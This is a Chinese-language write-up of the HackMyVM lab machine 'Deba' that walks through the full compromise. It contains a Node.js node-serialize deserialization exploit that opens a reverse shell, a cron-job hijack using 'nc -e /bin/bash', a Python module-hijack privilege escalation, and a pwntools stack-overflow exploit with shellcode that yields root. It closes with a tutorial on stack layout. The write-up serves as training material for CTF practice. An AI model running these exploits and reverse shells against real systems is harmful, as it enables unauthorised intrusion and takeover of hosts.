---
title: HMV-Deba
description: 'Hack and fun.'
pubDate: 2026-01-12
image: /machine/Deba.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Linux Machine
  - Enumeration
  - Privilege Escalation
  - Exploit Development
  - Deserialization
  - Reverse Engineering
  - XSS
---

![](/image/hmvmachines/Deba-1.png)

# 信息收集
## IP定位
```plain
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep "08:00:27"
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.102   08:00:27:57:b1:d0       (Unknown)
```

## Nmap扫描
```plain
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sTCV -T4 -p0-65535 192.168.0.102        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-12 06:22 EST
Nmap scan report for 192.168.0.102
Host is up (0.00037s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:e4:1e:f3:f6:82:7b:26:da:13:2f:01:f9:d5:0d:5b (RSA)
|   256 7b:09:3e:d4:a7:2d:92:01:9d:7d:7f:32:c1:fd:93:5b (ECDSA)
|_  256 56:fd:3d:c2:19:fe:22:24:ca:2c:f8:07:90:1d:76:87 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
```

## 目录扫描
```plain
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.0.102     

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js
HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.0.102/_26-01-12_06-26-06.txt

Target: http://192.168.0.102/

[06:26:06] Starting: 

[06:26:26] 301 -  321B  - /node_modules  ->  http://192.168.0.102/node_modules/
[06:26:26] 200 -  992B  - /node_modules/
[06:26:27] 200 -   32KB - /package-lock.json
[06:26:27] 200 -  116B  - /package.json
[06:26:31] 403 -  278B  - /server-status
[06:26:31] 403 -  278B  - /server-status/
[06:26:31] 200 -  386B  - /server.js

Task Completed
```

```plain
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js,yaml -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,yaml,php,txt,html,zip,db,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 278]
/server.js            (Status: 200) [Size: 679]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1985031 / 1985040 (100.00%)
===============================================================
Finished
===============================================================
```

### /server.js
```plain
// 引入 express 框架，用于创建 Web 服务器
var express = require('express');

// 引入 cookie-parser，用于解析 HTTP 请求中的 Cookie
var cookieParser = require('cookie-parser');

// 引入 escape-html，用于对 HTML 特殊字符进行转义，防止 XSS
var escape = require('escape-html');

// 引入 node-serialize，用于对象的序列化与反序列化（⚠️存在安全风险）
var serialize = require('node-serialize');

// 创建一个 Express 应用实例
var app = express();

// 将 cookie-parser 作为中间件使用
// 这样 req.cookies 才能读取到客户端发送的 cookie
app.use(cookieParser())

// 定义 GET 请求，访问根路径 /
app.get('/', function(req, res) {

    // 判断客户端是否携带名为 profile 的 cookie
    if (req.cookies.profile) {

        // 将 cookie 中的 base64 字符串解码成普通字符串
        // ⚠️ Buffer 构造方式已被废弃，推荐使用 Buffer.from
        var str = new Buffer(req.cookies.profile,'base64').toString();

        // 使用 node-serialize 反序列化字符串为对象
        // ⚠️ 非常危险：如果 cookie 被用户篡改，可能触发代码执行
        var obj = serialize.unserialize(str);

        // 如果反序列化后的对象中存在 username 字段
        if (obj.username) {

            // 对 username 进行 HTML 转义，防止 XSS
            // 然后返回 “Hello 用户名”
            res.send("Hello " + escape(obj.username));
        }

    } else {

        // 如果客户端没有 profile cookie
        // 设置一个默认的 profile cookie（base64 编码的 JSON）
        res.cookie(
            'profile',
            "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=",
            {
                maxAge: 900000, // cookie 有效期 15 分钟（毫秒）
                httpOnly: true  // 只能通过 HTTP 访问，JS 无法读取
            }
        );
    }

    // 无论上面逻辑是否执行，最终都会执行这一句
    // ⚠️ 问题：如果前面已经 res.send 过，会导致逻辑混乱
    res.send("Hello World");
});

// 启动服务器，监听 3000 端口
app.listen(3000);

```

+ **使用 **`**cookie-parser**` 解析请求中的 cookie。
+ **使用 **`**node-serialize**` 来序列化和反序列化对象。
+ **访问根路径 **`**/**`：
+ 如果请求中有 `profile` cookie：
    1. 将 cookie 的 base64 内容解码成字符串。
    2. 使用 `serialize.unserialize` 将字符串转换成对象。
    3. 如果对象里有 `username`，用 `escape` 过滤后返回 `"Hello username"`。
+ 如果没有 `profile` cookie：
    1. 服务器设置一个默认的 `profile` cookie（内容是 base64 编码的 JSON）。
+ 默认返回 `"Hello World"`。

eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=

base64解码后为

{"username":"ajin","country":"india","city":"bangalore"}

# 漏洞理解
```plain
{
  "username": "_$$ND_FUNC$$_function(){
    require('child_process').exec('whoami',function() {})
  }()"
}
```

## 核心
是 `node-serialize` 库的 `unserialize` 函数。该函数在反序列化时，如果遇到特殊的函数标记（`_$$ND_FUNC$$_`），会执行该函数。攻击者可以构造一个特殊的序列化字符串，其中包含恶意代码，当服务器调用 `unserialize` 时就会执行这些代码。

## 关键点
`_$$ND_FUNC$$_`

这是 `node-serialize` 的特殊标记，意思是：

"嘿！我不是普通的字符串，我是一段要执行的函数代码！"

当 `node-serialize` 看到这个标记，它会：

1. 提取后面的字符串：`function(){require('child_process').exec('whoami',...`
2. 用 `eval()` 或 `new Function()` 把它变成真正的函数
3. 立即执行这个函数（因为有 `()` 在最后）

```plain
// 反序列化（漏洞在这里！）
对象 = serialize.unserialize(解码后的);
// node-serialize看到_$$ND_FUNC$$_，会执行后面的函数代码
// 结果：黑客的代码在服务器上运行了！
```

# 漏洞利用
## 反弹shell
```plain
// reverse_shell_exploit.js
const http = require('http');
const net = require('net');

// 配置
const config = {
    target: '192.168.0.102:3000',
    attacker: '192.168.0.106',
    shellPort: 4444
};

// 创建恶意 cookie
function createReverseShellCookie() {
    // 使用 Node.js 创建反向连接
    const reverseCode = `
        var net = require('net');
        var cp = require('child_process');
        var sh = cp.spawn('/bin/sh', []);
        var client = new net.Socket();
        client.connect(${config.shellPort}, '${config.attacker}', function() {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
    `;
    
    const payload = {
        username: `_$$ND_FUNC$$_function(){${reverseCode}}()`
    };
    
    return Buffer.from(JSON.stringify(payload)).toString('base64');
}

// 启动监听
function startListener(port) {
    console.log(`[+] 启动监听器在端口 ${port}...`);
    
    const server = net.createServer((socket) => {
        console.log('[+] 收到反向连接!');
        console.log('[+] 远程地址:', socket.remoteAddress);
        
        // 交互式 shell
        process.stdin.pipe(socket);
        socket.pipe(process.stdout);
        
        socket.on('close', () => {
            console.log('[!] 连接关闭');
            process.exit();
        });
    });
    
    server.listen(port, () => {
        console.log(`[+] 监听器在 ${config.attacker}:${port} 启动成功`);
        
        // 发送攻击请求
        setTimeout(() => sendExploit(), 1000);
    });
}

// 发送攻击请求
function sendExploit() {
    const cookieValue = createReverseShellCookie();
    console.log('[+] 发送恶意请求...');
    
    const options = {
        hostname: '192.168.0.102',
        port: 3000,
        path: '/',
        method: 'GET',
        headers: {
            'Cookie': `profile=${cookieValue}`
        }
    };
    
    const req = http.request(options, (res) => {
        console.log(`[+] 服务器响应状态: ${res.statusCode}`);
        res.on('data', () => {}); // 忽略响应数据
    });
    
    req.on('error', (e) => {
        console.log('[!] 请求失败:', e.message);
    });
    
    req.end();
}

// 主函数
console.log(`
====================================
    Node.js 反序列化反向 Shell
====================================
目标: ${config.target}
攻击机: ${config.attacker}
监听端口: ${config.shellPort}
====================================
`);

startListener(config.shellPort);
```

> {"username":"_$$ND_FUNC$$_function(){\n var net = require('net');\n var cp = require('child_process');\n var sh = cp.spawn('/bin/sh', []);\n var client = new net.Socket();\n client.connect(4444, '192.168.0.106', function() {\n client.pipe(sh.stdin);\n sh.stdout.pipe(client);\n sh.stderr.pipe(client);\n });\n }()"}
>

```plain
npm install node-serialize axios
node exploit_deserialize.js
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# node shell.js                   

====================================
    Node.js 反序列化反向 Shell
====================================
目标: 192.168.0.102:3000
攻击机: 192.168.0.106
监听端口: 4444
====================================

[+] 启动监听器在端口 4444...
[+] 监听器在 192.168.0.106:4444 启动成功
[+] 发送恶意请求...
[+] 服务器响应状态: 200
[+] 收到反向连接!
[+] 远程地址: ::ffff:192.168.0.102
whoami
www-data
```

## 升级tty
```plain
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



```plain
www-data@debian:/home/low$ cat user.txt
cat user.txt
justdeserialize
```

## python库劫持提权-low
```plain
www-data@debian:/home/low$ sudo -l
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py
```

+ www-data 用户可以以 low 用户身份 运行指定脚本
+ 不需要密码 (NOPASSWD)
+ 可以运行：`/usr/bin/python3 /home/low/scripts/script.py`

```plain
www-data@debian:/home/low$ cat /home/low/scripts/script.py
cat /home/low/scripts/script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")
```



### **用 **`cat >`** 覆盖 **`main.py`** 内容**
```plain
www-data@debian:/home/low$ 
cat > /home/low/scripts/main.py << 'EOF'
import os
os.system('bash')
EOF
```

+ 使用 shell 的重定向 `>` **直接覆盖** `main.py` 的内容。
+ 新内容是一个恶意 Python 脚本：
    - 打印提示
    - 执行 `id` 和 `whoami` 查看当前身份
    - 启动一个 `bash` shell（获得交互式控制）

✅ 成功注入恶意代码到 `main.py`。

### **触发目标脚本执行（以 **`low`** 身份）**
```plain
www-data@debian:/home/low$ sudo -u low /usr/bin/python3 /home/low/scripts/script.py
```

+ 系统以 `low` 用户身份运行 `script.py`
+ 假设 `script.py` 内容类似：

```plain
# script.py
import main  # 从当前目录导入 main.py
main.run()
```

+ 由于 Python 默认优先从**当前工作目录**导入模块，因此会加载被篡改的 `main.py`

## 计时任务提权-debain
```plain
low@debian:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/bwrap
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
low@debian:/$ cat /etc/cron*
cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" >> /home/debian/Documentos/log 
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

low@debian:/home/debian/Documentos$ ls -al
ls -al
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  460 ene 12 13:36 log
```

发现该目录咱们这个`low`用户可写，尝试写一个`backup/dissapeared.py`进去：

```plain
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ chmod 777 backup
low@debian:/home/debian/Documentos$ cd backup/
low@debian:/home/debian/Documentos/backup$ echo "import os;os.system('nc -e /bin/bash 192.168.0.106 1234')" > dissapeared.py
low@debian:/home/debian/Documentos/backup$ chmod +x dissapeared.py
```

```plain
┌──(root㉿kali)-[/home/kali]
└─# nc -lvvp 1234
listening on [any] 1234 ...
192.168.0.102: inverse host lookup failed: Unknown host
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.102] 47150
id
uid=1000(debian) gid=1000(debian) grupos=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),114(lpadmin),115(scanner)
```

## 提权-root
### 升级tty
```plain
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### sudo -l
```plain
debian@debian:/$ sudo -l
sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine
        /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
```

 允许普通用户以 root 身份运行 Wine 来执行一个“存在缓冲区溢出漏洞”的程序  

#### ① brainfuck.exe 是什么？
+ Windows 程序
+ 明确标注 **Buffer Overflow Vulnerable**
+ 说明存在 **内存破坏类漏洞**

#### ② wine 在 sudo 下是 root
+ wine 进程 = root
+ wine 加载的 exe = **root 权限上下文**

#### ③ 缓冲区溢出意味着什么？
+ 覆盖返回地址 / 函数指针
+ 控制程序执行流
+ **执行任意代码**

#### ④ 任意代码在谁的权限下执行？
+ 👉 **root**



### brainfuck.exe
```plain
debian@debian:/$ file /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
file /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
/opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

```plain
debian@debian:/opt/Buffer-Overflow-Vulnerable-app$ ls -al
ls -al
total 9240
drwxr-xr-x  6 debian debian    4096 may  7  2021 .
drwxr-xr-x  3 root   root      4096 may  7  2021 ..
-rw-r--r--  1 debian debian   21190 may  7  2021 brainfuck.exe
-rw-r--r--  1 debian debian   21190 may  7  2021 brainpan.exe
-rw-r--r--  1 debian debian   13312 may  7  2021 dostackbufferoverflowgood.exe
drwxr-xr-x  8 debian debian    4096 may  7  2021 .git
drwxr-xr-x 54 debian debian    4096 may  7  2021 node_modules
-rw-r--r--  1 debian debian      60 may  7  2021 NOTE.txt
drwxr-xr-x  2 debian debian    4096 may  7  2021 oscp
-rw-r--r--  1 debian debian   14740 may  7  2021 package-lock.json
-rw-r--r--  1 debian debian     277 may  7  2021 README.md
-rw-r--r--  1 debian debian 9266237 may  7  2021 SLMail.exe
-rw-r--r--  1 debian debian   76152 may  7  2021 vcruntime140.dll
drwxr-xr-x  2 debian debian    4096 may  7  2021 vulnserver
```

## pwn环境搭建


```plain
python3 -m venv pwn  
source ./pwn/bin/activate 
┌──(pwn)─(root㉿kali)-[/home/kali/Desktop/tools/pwndbg]
└─# python3 -m pip install --upgrade pwntools -i https://pypi.doubanio.com/simple

git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

┌──(pwn)─(root㉿kali)-[/home/kali/Desktop/tools/pwndbg]
└─# gdb                                                                          
GNU gdb (Debian 17.1-1) 17.1
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
Want to NOP some instructions? Use patch <address> 'nop; nop; nop'
pwndbg> 

┌──(pwn)─(root㉿kali)-[/home/kali/Desktop/tools/pwndbg]
└─# sudo apt install ghidra -y


```

## 栈溢出漏洞
```plain
sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
[+] initializing winsock...done.
[+] server socket created.
[+] bind done on port 9999
[+] waiting for connections.
```

```plain
┌──(root㉿kali)-[/home/kali/Desktop/hmv]
└─# nc 192.168.0.102 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```



```plain
┌──(pwn)─(root㉿kali)-[/home/kali/Desktop/tools/pwndbg]
└─# ghidra

//将项目拖入进行反编译

/* WARNING: Removing unreachable block (ram,0x311716c5) */

int __cdecl _main(int _Argc,char **_Argv,char **_Env)

{
  int iVar1;
  size_t in_stack_fffff9f0;
  sockaddr local_5dc;
  sockaddr local_5cc;
  SOCKET local_5b4;
  SOCKET local_5b0;
  WSADATA local_5ac;
  int local_414;
  int local_410;
  int local_40c;
  char *local_408;
  char *local_404;
  char *local_400;
  char local_3fc [1016];
  
  __alloca(in_stack_fffff9f0);
  ___main();
  local_400 = 
  "_|                            _|                                        \n_|_|_|    _|  _|_|    _ |_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _ |\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _ |\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          >> "
  ;
  local_404 = "                          ACCESS DENIED\n";
  local_408 = "                          ACCESS GRANTED\n";
  local_410 = 9999;
  local_414 = 1;
  printf("[+] initializing winsock...");
  iVar1 = _WSAStartup@8(0x202,&local_5ac);
  if (iVar1 == 0) {
    printf("done.\n");
    local_5b0 = socket(2,1,0);
    if (local_5b0 == 0xffffffff) {
      iVar1 = _WSAGetLastError@0();
      printf("[!] could not create socket: %d",iVar1);
    }
    printf("[+] server socket created.\n");
    local_5cc.sa_family = 2;
    local_5cc.sa_data[2] = '\0';
    local_5cc.sa_data[3] = '\0';
    local_5cc.sa_data[4] = '\0';
    local_5cc.sa_data[5] = '\0';
    local_5cc.sa_data._0_2_ = htons(9999);
    iVar1 = bind(local_5b0,&local_5cc,0x10);
    if (iVar1 == -1) {
      iVar1 = _WSAGetLastError@0();
      printf("[!] bind failed: %d",iVar1);
    }
    printf("[+] bind done on port %d\n",local_410);
    listen(local_5b0,3);
    printf("[+] waiting for connections.\n");
    local_40c = 0x10;
    while (local_5b4 = accept(local_5b0,&local_5dc,&local_40c), local_5b4 != 0xffffffff) {
      printf("[+] received connection.\n");
      memset(local_3fc,0,1000);
      iVar1 = strlen(local_400);
      send(local_5b4,local_400,iVar1,0);
      recv(local_5b4,local_3fc,1000,0);
      local_414 = get_reply(local_3fc);
      printf("[+] check is %d\n",local_414);
      iVar1 = get_reply(local_3fc);
      if (iVar1 == 0) {
        iVar1 = strlen(local_404);
        send(local_5b4,local_408,iVar1,0);
      }
      else {
        iVar1 = strlen(local_408);
        send(local_5b4,local_404,iVar1,0);
      }
      closesocket(local_5b4);
    }
    iVar1 = _WSAGetLastError@0();
    printf("[!] accept failed: %d",iVar1);
  }
  else {
    iVar1 = _WSAGetLastError@0();
    printf("[!] winsock init failed: %d",iVar1);
  }
  return 1;
}
```



```plain
void get_reply(char *param_1)
{
    printf("[get_reply] s = [%s]\n", param_1);
    strcpy(local_buffer, param_1);          // ⚠️ 栈溢出漏洞！
    param1 = strlen(local_buffer);
    printf("[get_reply] copied %d bytes to buffer\n", param1);
    strcmp(local_buffer, "shitstorm\n");
}
```

关键信息：

+ `strcpy()` 无长度检查
+ `recv()` 接收最多1000字节
+ `local_buffer` 是栈上的局部变量

### 一、从反编译代码开始（这是唯一正确的起点）
你给的 `get_reply` 反编译结果是**完全正确的**：

```plain
int __cdecl get_reply(char *Source)
{
  size_t v1; // eax
  char Dest; // [esp+10h] [ebp-208h]

  printf("[get_reply] s = [%s]\n", Source);
  strcpy(&Dest, Source);
  v1 = strlen(&Dest);
  printf("[get_reply] copied %d bytes to buffer\n", v1);
  return strcmp(&Dest, "shitstorm\n");
}
```

这里我们只看三行：

```plain
char Dest;                 // 栈上缓冲区
strcpy(&Dest, Source);     // 无长度检查
return strcmp(&Dest, ...); // 之后还会返回
```

结论 1（**漏洞定性**）：

**这是一个标准的栈溢出函数，利用点 100% 成立**

这一点你没有任何问题。

---

### 二、Dest 到底有多大？（这是 offset 的数学来源）
关键是这一行：

```plain
char Dest; // [ebp-208h]
```

这句话不是“一个 char”，而是 **一个以 **`**ebp-0x208**`** 为起始的缓冲区**

结合函数栈结构：

```plain
高地址
[ RET ]        <- EIP
[ saved EBP ]
[ Dest buffer ]  <- 从 ebp-0x208 开始
低地址
```

### 关键计算（这是整个 exp 的“根”）：
+ Dest 起始地址：`EBP - 0x208`
+ 返回地址 RET：`EBP + 4`

所以 **从 Dest 到 RET 的字节数是**：

```plain
(EBP + 4) - (EBP - 0x208)
= 0x208 + 4
= 0x20C
= 524 字节
```

结论 2（**offset 精确来源**）：

**覆盖 RET 需要 524 字节 junk**

这就是你写的：

```plain
junk = b'a' * 524
```

不是猜的，不是试的，是**栈布局直接算出来的**。

---

### 三、为什么 strcpy 一定能覆盖到 RET？
因为：

```plain
recv(sock, buf, 1000, 0);
```

而 `Dest` 只有：

```plain
0x208 = 520 字节
```

`recv` 允许你送 1000 字节，`strcpy` 不检查长度：

**你至少可以覆盖到：**

+ buffer
+ saved EBP
+ RET
+ RET 后的栈内容

结论 3（**利用可达性**）：

**EIP 可控是必然的，不是可能**

---

### 四、ret_addr 是怎么“合法”找出来的？
你做了两次交叉验证，这一步是**教科书级别正确**。

#### 1️⃣ ropper 搜索
```plain
ropper --file brainfuck.exe --search 'jmp esp'
```

结果：

```plain
0x311712f3: jmp esp;
```

#### 2️⃣ objdump 再确认一次
```plain
objdump -D brainfuck.exe | grep jmp | grep esp
```

结果：

```plain
311712f3: ff e4  jmp *%esp
```

结论 4（**控制流接管点**）：

**0x311712f3 是一个真实存在、可执行、无歧义的 **`**jmp esp**`

这一步没有任何问题。

---

### 五、为什么 payload 结构必须是这样？
你最终的 payload 是：

```plain
payload = junk + ret_addr + shellcode
```

我们按 CPU 执行顺序解释：

---

#### ① `junk = 'a' * 524`
+ 覆盖 `Dest`
+ 覆盖 saved EBP
+ **正好覆盖到 RET 前一字节**

---

#### ② `ret_addr = 0x311712f3`
RET 被覆盖后，函数 `ret` 等价于：

```plain
EIP = 0x311712f3
```

而这条指令是：

```plain
jmp esp
```

---

#### ③ `jmp esp` 跳到哪里？
**此时 ESP 指向哪里？**

就在：

```plain
RET 后面的内容
```

也就是：

```plain
shellcode
```

结论 5（**执行流闭环**）：

**RET → jmp esp → shellcode**

控制流是完全闭合的，没有缺口

# Exp
```plain
from pwn import *

context.update(os='linux', arch='i386')
target_ip = '192.168.10.102'
target_port = 9999

junk = b'a' * 524
ret_addr = p32(0x311712f3)
# execve("/bin/sh") shellcode（32位）
shellcode = asm(shellcraft.sh())

payload = junk + ret_addr + shellcode

try:
    conn = remote(target_ip, target_port)
    conn.recvuntil(b'>>')
    
    # 发送 Payload
    conn.send(payload)
    log.info(f"[+] Exploit!!!!!")
    conn.interactive()
   
except Exception as e:
    log.error(f"[-] Exploit failed: {e}")
finally:
    conn.close()                      

```

```plain
cat root.txt
BoFsavetheworld
```



# 补充知识
## 1️⃣ 寄存器 = CPU 自己口袋里的变量
寄存器是：

+ **极小**
+ **极快**
+ **数量很少**

在 32 位 x86 里，你现在只需要认识这几个：

| 寄存器 | 作用（人话） |
| --- | --- |
| **EIP** | 下一条要执行的指令地址 |
| **ESP** | 栈顶在哪里 |
| **EBP** | 当前函数的“参考点” |
| **EAX** | 临时变量 / 返回值 |


👉 **你现在只要记住前三个**

---

## 2️⃣ 最重要的一个寄存器：EIP
**EIP 决定“程序下一步去哪”**

+ EIP = 0x1234  
→ CPU 去 0x1234 执行指令

所以在 pwn 里一句话就是：

**谁能控制 EIP，谁就能控制程序**

---

## 第三层：什么是栈？（不讲内存模型）
### 1️⃣ 栈是“函数用的草稿纸”
当函数被调用时：

+ 会在栈上放：
    - 局部变量
    - 返回地址
    - 一些临时数据

你可以把栈画成一列盒子：

```plain
高地址
┌──────────┐
│ 返回地址 │ ← EIP 从这里来
├──────────┤
│ 旧 EBP   │
├──────────┤
│ 局部变量 │ ← strcpy 写的地方
└──────────┘
低地址
```

---

### 2️⃣ ESP 和 EBP 是干嘛的？
+ **ESP**：指向“最上面的盒子”
+ **EBP**：指向“这一摞盒子的固定参考点”

EBP 的作用一句话：

**“让我能找到自己的局部变量和返回地址”**

---

## 第四层：函数返回发生了什么？（超级关键）
当一个函数结束时，会执行两步：

```plain
leave
ret
```

你现在不用记指令，只记效果：

### `ret` 干了什么？
**从栈里取一个 4 字节地址，放进 EIP**

也就是：

```plain
EIP = *(ESP)
```

💥 这就是漏洞利用的入口。

---

## 第五层：什么是“栈溢出”？
你看这行代码：

```plain
strcpy(Dest, Source);
```

人话翻译：

**不停地把 Source 的内容复制到 Dest，直到遇到 \0**

但 Dest 在栈上，大小是有限的。

如果 Source 太长：

```plain
Dest 的空间 → 写完了
继续写 → 覆盖旧 EBP
继续写 → 覆盖返回地址（RET）
```

⚠️ 一旦返回地址被覆盖：

**ret 取到的是“你写进去的东西”**

于是：

**你控制了 EIP**

---



我们用一句话串起来：

strcpy 写爆栈 → 覆盖返回地址 → ret 把你写的值放进 EIP → CPU 跳到你指定的位置执行

---

### 那 `jmp esp` 是干嘛的？
你之前问：

ropper --search 'jmp esp' 是为什么？

现在答案你应该能接受了：

+ 你控制了 EIP
+ 你不知道 shellcode 在哪
+ 但 **ESP 一定指向你的数据**

`jmp esp` 的作用就是：

**EIP = ESP**

也就是：

**“跳到我现在这堆栈数据里执行”**

---

## 为什么ESP一定指向你的数据
 因为你的输入是通过函数参数被拷贝到栈上的，而栈顶（ESP）正好就在这片区域附近  

### 第一步：你的数据是“怎么进程序的”？
你现在的程序是 **网络服务**，流程本质是：

```plain
socket recv → 把你发的数据放到一个 buffer → 传给 get_reply
```

于是 `get_reply(char *Source)` 里的 `Source`：

+ 指向的内容
+ **就是你从网络发过去的字节**

✅ 这是第一件事：  
**你的输入已经在内存里了**

---

### 第二步：`Dest` 在哪里？（这是关键）
反编译结果：

```plain
char Dest; // [esp+10h] [ebp-208h]
```

这句话信息量巨大，我们翻译成“人话”。

#### `[ebp-208h]` 是什么意思？
+ `EBP`：当前函数的“参考点”
+ `Dest`：在 EBP **下面** 0x208 字节的位置

也就是说：

```plain
EBP
│
├── 返回地址
├── 旧 EBP
├── ...
├── Dest[???]   ← 你的数据从这里开始写
```

👉 **Dest 在栈上**

---

### 第三步：`strcpy` 干了什么“坏事”？
```plain
